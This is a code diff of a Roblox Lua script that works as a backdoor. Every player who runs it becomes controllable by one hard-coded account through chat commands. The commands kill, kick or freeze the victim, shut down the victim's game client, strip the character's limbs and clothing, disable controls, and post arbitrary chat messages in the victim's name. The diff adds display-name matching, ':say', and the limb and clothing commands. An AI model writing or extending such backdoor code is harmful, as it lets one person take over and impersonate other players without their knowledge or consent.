@@ -1,62 +1,107 @@
-if Ghostplayer == nil then
+if Ghostplayer ~= nil then
+   return
+end
+
 Ghostplayer = "russelpalodizon"
 
---Commands List----------------------------------------------------
 
--- :kill
--- :kill all
--- :freeze
--- :unfreeze
--- :kick 
--- :kick all
--- :exit
--- :exit all
--- :bring 
--- :disablecontrol
--- :enablecontrol
--- :fling
--- :sit
--- :
-------------------------------------------------------------------------
+--[[ Commands List ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+:kill
+:kill all
+:freeze
+:unfreeze
+:kick 
+:kick all
+:exit
+:exit all
+:bring
+:bring all
+:disablecontrol
+:enablecontrol
+:fling
+:sit
+:say
+:removearms
+:removelegs
+:nake
+:
+
+]]------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
+---Send Message Function
+local function SendMessage(msg)
+ if game:GetService("TextChatService").TextChannels.RBXGeneral then
+    game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(msg)
+ else
+    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+ end
+end
+---
+
+
+
+
+local MyName = game.Players.LocalPlayer.Name
+local MyDisplayName = game.Players.LocalPlayer.DisplayName
 
 local function ExecuteAdminCMD()
 game.Players[Ghostplayer].Chatted:connect(function(admin_msg)
-if admin_msg == ":kill "..game.Players.LocalPlayer.Name or admin_msg == ":kill all" and game.Players.LocalPlayer.Name ~= Ghostplayer then
+if admin_msg == ":kill "..MyName or admin_msg == ":kill "..MyDisplayName or admin_msg == ":kill all" and MyName ~= Ghostplayer then
    game.Players.LocalPlayer.Character.Head:Destroy()
-elseif admin_msg == ":freeze "..game.Players.LocalPlayer.Name then
+elseif admin_msg == ":freeze "..MyName or admin_msg == ":freeze "..MyDisplayName then
    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-elseif admin_msg == ":unfreeze "..game.Players.LocalPlayer.Name then
+elseif admin_msg == ":unfreeze "..MyName or admin_msg == ":unfreeze "..MyDisplayName then
    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-elseif admin_msg == ":kick "..game.Players.LocalPlayer.Name then
+elseif admin_msg == ":kick "..MyName or admin_msg == ":kick "..MyDisplayName or admin_msg == ":kick all" and MyName ~= Ghostplayer then
    game.Players.LocalPlayer:Kick("I Can Kick you Noob HAHAHAHAAHH")
-elseif admin_msg == ":kick all" and game.Players.LocalPlayer.Name ~= Ghostplayer then
-   game.Players.LocalPlayer:Kick("I Can Kick you Noob HAHAHAHAAHH")
-elseif admin_msg == ":exit "..game.Players.LocalPlayer.Name or admin_msg == ":exit all" and game.Players.LocalPlayer.Name ~= Ghostplayer then
+elseif admin_msg == ":exit "..MyName or admin_msg == ":exit "..MyDisplayName or admin_msg == ":exit all" and MyName ~= Ghostplayer then
    game:Shutdown()
-elseif admin_msg == ":bring "..game.Players.LocalPlayer.Name then
+elseif admin_msg == ":bring "..MyName or admin_msg == ":bring "..MyDisplayName or admin_msg == ":bring all" and MyName ~= Ghostplayer then
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[Ghostplayer].Character.HumanoidRootPart.CFrame
-elseif admin_msg == ":disablecontrol "..game.Players.LocalPlayer.Name then
+elseif admin_msg == ":disablecontrol "..MyName or admin_msg == ":disablecontrol "..MyDisplayName then
    controls = require(game:GetService("Players").LocalPlayer.PlayerScripts.PlayerModule):GetControls() controls:Disable()
-elseif admin_msg == ":enablecontrol "..game.Players.LocalPlayer.Name then
+elseif admin_msg == ":enablecontrol "..MyName or admin_msg == ":enablecontrol "..MyDisplayName then
    controls = require(game:GetService("Players").LocalPlayer.PlayerScripts.PlayerModule):GetControls() controls:Enable()
-elseif admin_msg == ":fling "..game.Players.LocalPlayer.Name then
+elseif admin_msg == ":fling "..MyName or admin_msg == ":fling "..MyDisplayName then
    bambam = Instance.new("BodyThrust")
    bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
    bambam.Force = Vector3.new(999990,0,999990)
    bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position 
-elseif admin_msg == ":sit "..game.Players.LocalPlayer.Name then
+elseif admin_msg == ":sit "..MyName or admin_msg == ":sit "..MyDisplayName then
    game.Players.LocalPlayer.Character.Humanoid.Sit = true
-elseif admin_msg == ":" and game.Players.LocalPlayer.Name ~= Ghostplayer then
-   if game:GetService("TextChatService").TextChannels.RBXGeneral then
-       game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("Im Here")
-    else
-       game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Im Here" ,"All")
-    end
+elseif string.find(admin_msg, ":say "..MyName.." ") or string.find(admin_msg, ":say "..MyDisplayName.." ") then
+   if string.find(admin_msg, MyName) then
+      admin_msg = string.gsub(admin_msg, ":say "..MyName, "")
+   else
+      admin_msg = string.gsub(admin_msg, ":say "..MyDisplayName, "")
+   end
+   SendMessage(admin_msg)
+elseif admin_msg == ":removearms "..MyName or admin_msg == ":removearms "..MyDisplayName then
+   for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+     if v.Name == "Right Arm" or v.Name == "Left Arm" or v.Name == "RightUpperArm" or v.Name == "LeftUpperArm" then
+	    v:Destroy()
+	 end
+   end
+elseif admin_msg == ":removelegs "..MyName or admin_msg == ":removelegs "..MyDisplayName then
+   for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+     if v.Name == "Right Leg" or v.Name == "Left Leg" or v.Name == "RightUpperLeg" or v.Name == "LeftUpperLeg" then
+	    v:Destroy()
+	 end
+   end
+elseif admin_msg == ":nake "..MyName or admin_msg == ":nake "..MyDisplayName then
+   for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+     if v:IsA("Clothing") or v:IsA("ShirtGraphic") then
+	    v:Destroy()
+	 end
+   end
+elseif admin_msg == ":" and MyName ~= Ghostplayer then
+   SendMessage("Im Here")
 end
 end)
 end
+
 
 FoundAdmin = false
 game:GetService('RunService').Heartbeat:connect(function()
@@ -69,4 +114,3 @@ else
    FoundAdmin = false
 end
 end)
-end
